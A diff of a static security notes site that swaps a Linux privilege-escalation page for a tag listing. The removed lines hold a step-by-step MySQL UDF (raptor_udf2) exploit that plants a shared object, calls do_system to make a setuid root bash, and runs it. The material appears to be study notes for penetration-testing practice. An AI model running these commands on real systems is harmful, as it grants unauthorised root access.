@@ -9,24 +9,21 @@
     <meta name="generator" content="Retype 2.3.0">
 
     <!-- Primary Meta Tags -->
-    <title>MySQL 4.x/5.x</title>
-    <meta name="title" content="MySQL 4.x/5.x">
-    <meta name="description" content="Check MySQL configuration:" />
+    <title>binary</title>
+    <meta name="title" content="binary">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://caueb.github.io/linuxprivesc/mysql4x8a1a7/" />
+    <link rel="canonical" href="https://caueb.github.io/tags/binary/" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/linuxprivesc/mysql4x8a1a7/">
-    <meta property="og:title" content="MySQL 4.x/5.x">
-    <meta property="og:description" content="Check MySQL configuration:">
+    <meta property="og:url" content="https://caueb.github.io/tags/binary/">
+    <meta property="og:title" content="binary">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/mysql4x8a1a7/">
-    <meta property="twitter:title" content="MySQL 4.x/5.x">
-    <meta property="twitter:description" content="Check MySQL configuration:">
+    <meta property="twitter:url" content="https://caueb.github.io/tags/binary/">
+    <meta property="twitter:title" content="binary">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -35,7 +32,6 @@
     <script type="text/javascript" src="../../resources/js/config.js?v=2.3.0.709264694281" data-turbo-eval="false" defer></script>
     <script type="text/javascript" src="../../resources/js/retype.js?v=2.3.0" data-turbo-eval="false" defer></script>
     <script id="lunr-js" type="text/javascript" src="../../resources/js/lunr.js?v=2.3.0.709264694281" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../../resources/js/prism.js?v=2.3.0.709264694281" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -201,104 +197,23 @@
                                 <div id="docs-sidebar-right-toggle"></div>
                 
                                 <!-- Page content  -->
-<doc-anchor-target id="mysql-4x5x" class="break-words">
+<doc-anchor-target id="tag-binary" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#mysql-4x5x">#</doc-anchor-trigger>
-        <span>MySQL 4.x/5.x</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#tag-binary">#</doc-anchor-trigger>
+        <span>Tag: binary</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="enumerate-programs-running">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#enumerate-programs-running">#</doc-anchor-trigger>
-        <span>Enumerate programs running</span>
-    </h2>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ ps aux | grep &quot;^root&quot;</code></pre>
-</doc-codeblock></div>
-<p>Check MySQL configuration:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep -v &quot;#&quot; | grep &quot;user&quot;
-user = root</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="prepare-the-exploit">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#prepare-the-exploit">#</doc-anchor-trigger>
-        <span>Prepare the exploit</span>
-    </h2>
-</doc-anchor-target>
-<doc-anchor-target id="download-and-compile-it">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#download-and-compile-it">#</doc-anchor-trigger>
-        <span>Download and compile it</span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li>Exploit: <a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></li>
-</ul>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gcc -g -c raptor_udf2.c
-$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="create-mysql-function">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#create-mysql-function">#</doc-anchor-trigger>
-        <span>Create MySQL function</span>
-    </h2>
-</doc-anchor-target>
-<doc-anchor-target id="connect-to-mysql">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#connect-to-mysql">#</doc-anchor-trigger>
-        <span>Connect to MySQL</span>
-    </h3>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ mysql -u root -p</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="find-the-plugins-directory">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#find-the-plugins-directory">#</doc-anchor-trigger>
-        <span>Find the plugins directory</span>
-    </h3>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">mysql&gt; show variables like 'plugin_dir';
-+---------------+---------------------------------------------+
-| Variable_name | Value                                       |
-+---------------+---------------------------------------------+
-| plugin_dir    | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
-+---------------+---------------------------------------------+</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="load-the-shared-object-into-mysql">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#load-the-shared-object-into-mysql">#</doc-anchor-trigger>
-        <span>Load the shared object into MySQL</span>
-    </h3>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">mysql&gt; use mysql;
-mysql&gt; create table foo(line blob);
-mysql&gt; insert into foo values(load_file('/tmp/raptor_udf2.so';);
-mysql&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
-mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';
-mysql&gt; select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
-mysql&gt; exit</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="get-root-shell">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#get-root-shell">#</doc-anchor-trigger>
-        <span>Get root shell</span>
-    </h2>
-</doc-anchor-target>
-<doc-anchor-target id="execute-rootbash-shell">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#execute-rootbash-shell">#</doc-anchor-trigger>
-        <span>Execute rootbash shell</span>
-    </h3>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ /tmp/rootbash -p</code></pre>
-</doc-codeblock></div>
+<p>See all <a href="../">tags</a>.</p>
+<a class="no-link mb-6 overflow-hidden border border-gray-200 rounded-lg md:flex dark:border-dark-700 hover:border-gray-400 dark:hover:border-dark-450" href="../../writeups/htb/challenges/find-the-easy-pass/">
+    <div class="relative shrink-0 bg-gray-300 md:w-5/12 pb-9/16 md:pb-0 dark:bg-dark-450">
+        <img class="absolute object-cover w-full h-full" src="../../writeups/htb/challenges/find-the-easy-pass/images/image1.png" />
+    </div>
+    <div class="p-6">
+        <div class="text-xs font-semibold text-blue-500 uppercase dark:text-blue-400">Writeups &#8226; HTB &#8226; Challenges</div>
+        <div class="mt-2 text-lg font-semibold leading-snug text-gray-900 dark:text-white md:text-xl">Find The Easy Pass</div>
+        <div class="line-clamp-3"><p class="hidden mt-2 md:block">Category</p></div>
+    </div>
+</a>
 
                                 
                                 <!-- Required only on API pages -->
@@ -306,27 +221,6 @@ mysql&gt; exit</code></pre>
                             </div>
                             <footer class="clear-both">
                             
-                                <nav class="flex mt-14">
-                                    <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../linuxprivesc/kernelexp14b2d/">
-                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
-                                            <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Kernel Exploit</span>
-                                            </span>
-                                        </a>
-                                    </div>
-                            
-                                    <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../linuxprivesc/nfs6b60f/">
-                                            <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">NFS</span>
-                                            </span>
-                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
-                                        </a>
-                                    </div>
-                                </nav>
                             </footer>
                         </main>
                 
@@ -365,6 +259,6 @@ mysql&gt; exit</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script>window.__DOCS__ = { "title": "MySQL 4.x/5.x", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+    <script>window.__DOCS__ = { "title": "binary", level: 2, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false }</script>
 </body>
 </html>
